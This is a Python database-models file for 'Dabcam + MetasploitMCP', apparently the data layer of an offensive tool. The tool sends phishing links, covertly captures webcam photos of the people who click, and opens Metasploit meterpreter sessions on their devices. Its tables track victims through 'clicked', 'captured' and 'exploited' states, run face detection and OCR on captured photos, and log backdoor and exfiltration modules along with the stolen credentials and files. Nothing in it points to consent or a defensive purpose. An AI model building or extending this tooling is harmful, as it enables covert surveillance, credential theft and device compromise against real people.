"""
Database Models for Dabcam + MetasploitMCP

Unified schema for campaign management, target tracking, and exploitation
"""

from sqlalchemy import Column, String, Integer, DateTime, Boolean, JSON, Enum, ForeignKey, Text, LargeBinary
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import relationship
from datetime import datetime
import enum
import uuid

Base = declarative_base()

# ============================================
# Enums
# ============================================

class CampaignStatus(str, enum.Enum):
    draft = "draft"
    active = "active"
    paused = "paused"
    completed = "completed"
    failed = "failed"

class PayloadType(str, enum.Enum):
    camera_only = "camera_only"
    camera_msf = "camera_msf"  # Camera → Metasploit bridge
    msf_only = "msf_only"

class TargetStatus(str, enum.Enum):
    sent = "sent"              # Link sent to target
    clicked = "clicked"        # Target clicked link
    captured = "captured"      # Camera image captured
    exploited = "exploited"    # Metasploit session established
    failed = "failed"          # Attack failed

class MSFSessionStatus(str, enum.Enum):
    listening = "listening"
    active = "active"
    closed = "closed"
    errored = "errored"

# ============================================
# Campaign Model
# ============================================

class Campaign(Base):
    """Campaign configuration and tracking"""
    __tablename__ = "campaigns"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = Column(String(255), nullable=False, unique=True)
    description = Column(Text, nullable=True)
    status = Column(Enum(CampaignStatus), default=CampaignStatus.draft)
    payload_type = Column(Enum(PayloadType), default=PayloadType.camera_msf)

    # Metasploit Configuration
    msf_payload = Column(String(255), nullable=True)  # e.g., android/meterpreter/reverse_https
    msf_lhost = Column(String(255), nullable=True)    # Listener IP/domain
    msf_lport = Column(Integer, nullable=True)        # Listener port

    # Public URL (via ngrok/Serveo)
    ngrok_url = Column(String(255), nullable=True)
    ngrok_token = Column(String(255), nullable=True)

    # Phishing Configuration
    phishing_template = Column(String(50), default="jio")  # Template name
    phishing_domain = Column(String(255), nullable=True)

    # Statistics
    targets_total = Column(Integer, default=0)
    targets_clicked = Column(Integer, default=0)
    targets_captured = Column(Integer, default=0)
    targets_exploited = Column(Integer, default=0)

    # Metadata
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    created_by = Column(String(255), nullable=False)

    # Relationships
    targets = relationship("Target", back_populates="campaign", cascade="all, delete-orphan")
    photos = relationship("Photo", back_populates="campaign", cascade="all, delete-orphan")
    msf_sessions = relationship("MSFSession", back_populates="campaign", cascade="all, delete-orphan")

    def __repr__(self):
        return f"<Campaign {self.name} ({self.status})>"

# ============================================
# Target Model
# ============================================

class Target(Base):
    """Target tracking and status"""
    __tablename__ = "targets"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    campaign_id = Column(String(36), ForeignKey('campaigns.id'), nullable=False)

    # Target Identification
    identifier = Column(String(255), nullable=False)  # Email/username/ID
    email = Column(String(255), nullable=True)
    phone = Column(String(20), nullable=True)

    # Status Tracking
    status = Column(Enum(TargetStatus), default=TargetStatus.sent)
    link_sent_at = Column(DateTime, nullable=True)
    link_clicked_at = Column(DateTime, nullable=True)
    exploit_time = Column(DateTime, nullable=True)

    # Device Fingerprinting
    ip_address = Column(String(45), nullable=True)
    user_agent = Column(Text, nullable=True)
    device_info = Column(JSON, nullable=True)  # Browser, OS, etc.

    # Metasploit Session
    session_uuid = Column(String(36), nullable=True)
    session_id = Column(Integer, nullable=True)

    # Metadata
    created_at = Column(DateTime, default=datetime.utcnow)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    notes = Column(Text, nullable=True)

    # Relationships
    campaign = relationship("Campaign", back_populates="targets")
    photos = relationship("Photo", back_populates="target", cascade="all, delete-orphan")
    msf_session = relationship("MSFSession", back_populates="target", uselist=False)

    def __repr__(self):
        return f"<Target {self.identifier} ({self.status})>"

# ============================================
# Photo Model (Camera Captures)
# ============================================

class Photo(Base):
    """Captured camera images"""
    __tablename__ = "photos"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    campaign_id = Column(String(36), ForeignKey('campaigns.id'), nullable=False)
    target_id = Column(String(36), ForeignKey('targets.id'), nullable=False)

    # File Information
    filepath = Column(String(512), nullable=False)
    file_hash = Column(String(64), nullable=False, unique=True)  # SHA256
    file_size = Column(Integer, nullable=False)
    mime_type = Column(String(50), default="image/png")

    # Capture Details
    captured_at = Column(DateTime, default=datetime.utcnow)
    browser_time = Column(DateTime, nullable=True)

    # Image Metadata
    metadata = Column(JSON, nullable=True)  # EXIF, camera info, etc.

    # Processing
    analyzed = Column(Boolean, default=False)
    face_detected = Column(Boolean, default=False)
    ocr_text = Column(Text, nullable=True)

    # Relationships
    campaign = relationship("Campaign", back_populates="photos")
    target = relationship("Target", back_populates="photos")

    def __repr__(self):
        return f"<Photo {self.file_hash[:8]}... ({self.file_size} bytes)>"

# ============================================
# Metasploit Session Model
# ============================================

class MSFSession(Base):
    """Metasploit session tracking"""
    __tablename__ = "msf_sessions"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    campaign_id = Column(String(36), ForeignKey('campaigns.id'), nullable=False)
    target_id = Column(String(36), ForeignKey('targets.id'), nullable=False)

    # Session Information
    session_uuid = Column(String(36), nullable=True)
    session_id = Column(Integer, nullable=True)
    handler_id = Column(String(100), nullable=True)

    # Payload Configuration
    payload_type = Column(String(255), nullable=False)
    payload_url = Column(String(512), nullable=True)

    # Handler Details
    handler_port = Column(Integer, nullable=True)
    handler_lhost = Column(String(255), nullable=True)

    # Session Status
    status = Column(Enum(MSFSessionStatus), default=MSFSessionStatus.listening)
    established_at = Column(DateTime, nullable=True)
    last_activity = Column(DateTime, nullable=True)
    closed_at = Column(DateTime, nullable=True)

    # Session Data
    session_info = Column(JSON, nullable=True)  # Device info, OS, etc.

    # Metadata
    created_at = Column(DateTime, default=datetime.utcnow)
    created_by = Column(String(255), nullable=True)

    # Relationships
    campaign = relationship("Campaign", back_populates="msf_sessions")
    target = relationship("Target", back_populates="msf_session")
    executed_modules = relationship("PostModuleExecution", back_populates="session", cascade="all, delete-orphan")

    def __repr__(self):
        return f"<MSFSession {self.session_id} ({self.status})>"

# ============================================
# Post-Exploitation Module Execution
# ============================================

class PostModuleExecution(Base):
    """Track post-exploitation module execution"""
    __tablename__ = "post_module_executions"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    session_id = Column(String(36), ForeignKey('msf_sessions.id'), nullable=False)

    # Module Information
    module_name = Column(String(255), nullable=False)
    module_type = Column(String(50), nullable=False)  # e.g., 'gather', 'exfil', 'backdoor'

    # Execution Details
    executed_at = Column(DateTime, default=datetime.utcnow)
    execution_time_ms = Column(Integer, nullable=True)
    success = Column(Boolean, default=False)

    # Results
    output = Column(Text, nullable=True)
    data_exfiltrated = Column(JSON, nullable=True)  # Credentials, files, etc.
    error_message = Column(Text, nullable=True)

    # Relationships
    session = relationship("MSFSession", back_populates="executed_modules")

    def __repr__(self):
        return f"<PostModuleExecution {self.module_name} ({'success' if self.success else 'failed'})>"

# ============================================
# Audit Logging
# ============================================

class AuditLog(Base):
    """Security audit trail"""
    __tablename__ = "audit_logs"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Action Information
    action = Column(String(100), nullable=False)
    resource_type = Column(String(50), nullable=False)
    resource_id = Column(String(255), nullable=False)

    # User Information
    user = Column(String(255), nullable=False)
    ip_address = Column(String(45), nullable=True)

    # Details
    changes = Column(JSON, nullable=True)  # Before/after values
    result = Column(String(20), default="success")  # success/failure
    error_message = Column(Text, nullable=True)

    # Timing
    timestamp = Column(DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f"<AuditLog {self.action} {self.resource_type}/{self.resource_id}>"

# ============================================
# API Keys & Authentication
# ============================================

class APIKey(Base):
    """API key management for integrations"""
    __tablename__ = "api_keys"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Key Information
    name = Column(String(255), nullable=False)
    key_hash = Column(String(64), nullable=False, unique=True)

    # Permissions
    scopes = Column(JSON, default={})  # List of allowed scopes

    # Status
    active = Column(Boolean, default=True)
    last_used_at = Column(DateTime, nullable=True)

    # Metadata
    created_at = Column(DateTime, default=datetime.utcnow)
    created_by = Column(String(255), nullable=False)
    expires_at = Column(DateTime, nullable=True)

    def __repr__(self):
        return f"<APIKey {self.name}>"

# ============================================
# Session Tokens (for Web UI)
# ============================================

class SessionToken(Base):
    """Web session tokens"""
    __tablename__ = "session_tokens"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Token Information
    token_hash = Column(String(64), nullable=False, unique=True)
    user_id = Column(String(255), nullable=False)

    # Session Data
    ip_address = Column(String(45), nullable=False)
    user_agent = Column(Text, nullable=False)

    # Timing
    created_at = Column(DateTime, default=datetime.utcnow)
    expires_at = Column(DateTime, nullable=False)
    last_activity = Column(DateTime, default=datetime.utcnow)

    def __repr__(self):
        return f"<SessionToken {self.user_id}>"

# ============================================
# Webhook Delivery Tracking (Phase 3)
# ============================================

class WebhookDeliveryStatus(str, enum.Enum):
    pending = "pending"
    delivered = "delivered"
    failed = "failed"
    retrying = "retrying"

class WebhookDelivery(Base):
    """Track webhook delivery attempts and status"""
    __tablename__ = "webhook_deliveries"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Event Information
    subscription_id = Column(String(255), nullable=False, index=True)
    event_id = Column(String(255), nullable=False, index=True)
    event_type = Column(String(255), nullable=False)
    campaign_id = Column(String(255), nullable=True)
    target_id = Column(String(255), nullable=True)

    # Webhook Details
    url = Column(Text, nullable=False)
    request_body = Column(Text, nullable=True)  # Webhook payload (truncated)

    # Delivery Status
    status = Column(String(20), default=WebhookDeliveryStatus.pending.value, index=True)
    http_status = Column(Integer, nullable=True)
    response_body = Column(Text, nullable=True)  # First 1000 chars of response

    # Retry Information
    attempt_count = Column(Integer, default=0)
    max_attempts = Column(Integer, default=5)
    next_retry_at = Column(DateTime, nullable=True, index=True)
    last_error = Column(Text, nullable=True)

    # Timing
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    updated_at = Column(DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    delivered_at = Column(DateTime, nullable=True)

    # Composite indices for efficient queries
    __table_args__ = (
        ("ix_webhook_deliveries_subscription_created", ["subscription_id", "created_at"]),
        ("ix_webhook_deliveries_status_retry", ["status", "next_retry_at"]),
        ("ix_webhook_deliveries_event_status", ["event_id", "status"]),
    )

    def __repr__(self):
        return f"<WebhookDelivery {self.id} {self.status}>"

# ============================================
# Webhook Logs (Phase 3)
# ============================================

class WebhookLog(Base):
    """Historical logs of all webhook activity"""
    __tablename__ = "webhook_logs"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Event Information
    event_id = Column(String(255), nullable=False, index=True)
    event_type = Column(String(255), nullable=False, index=True)
    campaign_id = Column(String(255), nullable=True)
    target_id = Column(String(255), nullable=True)

    # Subscription Information
    subscription_id = Column(String(255), nullable=False, index=True)

    # Delivery Summary
    total_deliveries = Column(Integer, default=0)
    successful_deliveries = Column(Integer, default=0)
    failed_deliveries = Column(Integer, default=0)

    # Event Payload (truncated)
    event_payload = Column(JSON, nullable=True)

    # Processing Details
    processed_at = Column(DateTime, default=datetime.utcnow, index=True)
    completed_at = Column(DateTime, nullable=True)
    duration_ms = Column(Integer, nullable=True)

    def __repr__(self):
        return f"<WebhookLog {self.event_id} → {self.subscription_id}>"

# ============================================
# Webhook Replay Log (Phase 3)
# ============================================

class WebhookReplayStatus(str, enum.Enum):
    pending = "pending"
    in_progress = "in_progress"
    completed = "completed"
    failed = "failed"

class WebhookReplay(Base):
    """Track webhook replay operations"""
    __tablename__ = "webhook_replays"

    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))

    # Replay Configuration
    subscription_id = Column(String(255), nullable=True, index=True)
    event_id = Column(String(255), nullable=True, index=True)
    event_type = Column(String(255), nullable=True)

    # Filter Parameters
    filter_params = Column(JSON, nullable=True)

    # Replay Results
    status = Column(String(20), default=WebhookReplayStatus.pending.value)
    total_events = Column(Integer, default=0)
    events_queued = Column(Integer, default=0)
    events_delivered = Column(Integer, default=0)
    events_failed = Column(Integer, default=0)

    # Timing
    created_at = Column(DateTime, default=datetime.utcnow, index=True)
    started_at = Column(DateTime, nullable=True)
    completed_at = Column(DateTime, nullable=True)

    # Metadata
    created_by = Column(String(255), nullable=False)
    notes = Column(Text, nullable=True)

    def __repr__(self):
        return f"<WebhookReplay {self.id} {self.status}>"
